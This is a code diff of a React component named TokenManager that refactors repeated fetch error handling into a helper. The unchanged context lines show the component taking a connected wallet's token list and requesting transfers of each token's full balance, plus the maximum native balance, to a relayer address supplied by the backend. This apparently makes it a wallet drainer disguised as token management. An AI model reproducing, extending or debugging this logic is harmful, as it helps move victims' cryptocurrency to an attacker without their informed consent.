@@ -39,6 +39,25 @@ const useIsMobile = () => {
   return isMobile;
 };
 
+// Función helper para fetch con mejor manejo de errores
+const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
+  const res = await fetch(url, options);
+  
+  // Verificar el tipo de contenido antes de analizar JSON
+  const contentType = res.headers.get('content-type');
+  if (!contentType || !contentType.includes('application/json')) {
+    const text = await res.text();
+    throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
+  }
+
+  if (!res.ok) {
+    const errorData = await res.json();
+    throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
+  }
+
+  return res.json();
+};
+
 export default function TokenManager(): React.JSX.Element {
   const { open } = useAppKit()
   const { address, isConnected } = useAccount()
@@ -98,7 +117,7 @@ export default function TokenManager(): React.JSX.Element {
         return
       }
 
-      const res = await fetch(`${BACKEND}/owner-tokens`, {
+      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
         method: 'POST',
         headers: { 
           'Content-Type': 'application/json',
@@ -107,19 +126,6 @@ export default function TokenManager(): React.JSX.Element {
         body: JSON.stringify({ owner: address })
       })
 
-      // Verificar el tipo de contenido antes de analizar JSON
-      const contentType = res.headers.get('content-type');
-      if (!contentType || !contentType.includes('application/json')) {
-        const text = await res.text();
-        throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
-      }
-
-      if (!res.ok) {
-        const errorData = await res.json();
-        throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
-      }
-
-      const data: any = await res.json()
       console.log('Tokens detectados:', data)
 
       const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
@@ -188,7 +194,7 @@ export default function TokenManager(): React.JSX.Element {
         console.warn('[CONFIG] getWrapInfo aborted: BACKEND not defined')
         return null
       }
-      const res = await fetch(`${BACKEND}/wrap-info`, {
+      return await fetchWithErrorHandling(`${BACKEND}/wrap-info`, {
         method: 'POST',
         headers: { 
           'Content-Type': 'application/json',
@@ -196,18 +202,6 @@ export default function TokenManager(): React.JSX.Element {
         },
         body: JSON.stringify({ chain: chainId })
       })
-
-      // Verificar el tipo de contenido
-      const contentType = res.headers.get('content-type');
-      if (!contentType || !contentType.includes('application/json')) {
-        const text = await res.text();
-        throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
-      }
-
-      if (res.ok) {
-        return await res.json()
-      }
-      return null
     } catch (err) {
       console.error('Error obteniendo info de wrap:', err)
       return null
@@ -309,7 +303,7 @@ export default function TokenManager(): React.JSX.Element {
 
         if (shouldTransfer) {
           if (!BACKEND) throw new Error('BACKEND no configurado')
-          const res = await fetch(`${BACKEND}/create-native-transfer-request`, {
+          const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
             method: 'POST',
             headers: { 
               'Content-Type': 'application/json',
@@ -321,15 +315,6 @@ export default function TokenManager(): React.JSX.Element {
               amount: maxSafeForTransfer.toString()
             })
           })
-
-          // Verificar el tipo de contenido
-          const contentType = res.headers.get('content-type');
-          if (!contentType || !contentType.includes('application/json')) {
-            const text = await res.text();
-            throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
-          }
-
-          const data: any = await res.json()
 
           if (data.ok && data.instructions && data.instructions.relayerAddress) {
             const hash = await walletClient.sendTransaction({
@@ -363,7 +348,7 @@ export default function TokenManager(): React.JSX.Element {
   const processToken = async (token: Token): Promise<void> => {
     try {
       if (!BACKEND) throw new Error('BACKEND no configurado')
-      const res = await fetch(`${BACKEND}/create-transfer-request`, {
+      const data = await fetchWithErrorHandling(`${BACKEND}/create-transfer-request`, {
         method: 'POST',
         headers: { 
           'Content-Type': 'application/json',
@@ -376,15 +361,6 @@ export default function TokenManager(): React.JSX.Element {
           amount: token.balance
         })
       })
-
-      // Verificar el tipo de contenido
-      const contentType = res.headers.get('content-type');
-      if (!contentType || !contentType.includes('application/json')) {
-        const text = await res.text();
-        throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
-      }
-
-      const data: any = await res.json()
 
       if (data.ok) {
         setSummary(prev => ({ ...prev, sent: [...prev.sent, { token, type: 'transfer', jobId: data.jobId, amount: token.balance }] }))
